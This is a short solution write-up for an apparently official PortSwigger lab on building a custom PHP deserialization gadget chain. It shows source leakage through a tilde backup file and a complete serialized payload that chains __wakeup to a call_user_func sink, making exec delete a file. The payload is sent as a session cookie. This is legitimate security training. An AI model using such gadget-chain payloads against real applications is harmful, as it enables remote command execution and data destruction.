# Lab 09 — Developing a custom gadget chain for PHP deserialization

> **Expert** · [Official lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

**Entry point:** serialized-PHP session cookie · source via the tilde
backup trick · **Goal:** build a `CustomTemplate → DefaultMap` chain.

## Solution

1. Source leak: the site references
   `/cgi-bin/libs/CustomTemplate.php` → request
   `CustomTemplate.php~`.
2. Read the gadgets:
   - `CustomTemplate::__wakeup()` creates a `Product` from
     `default_desc_type` and `desc`.
   - `DefaultMap::__get()` runs `call_user_func($this->callback, $name)`
     when a missing attribute is read — `$name` becomes the function
     argument.
3. Build the chain: `default_desc_type` = your command; `desc` = a
   `DefaultMap` with `callback = exec`:

```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

4. Base64 + URL-encode as the session cookie and send — `__wakeup` asks the
   map for `default_desc_type`, `__get` fires `exec("rm ...")` — lab solved.

## Notes

The chain is three links: magic method (`__wakeup`) → controlled attribute
(`desc`) → `call_user_func` sink.
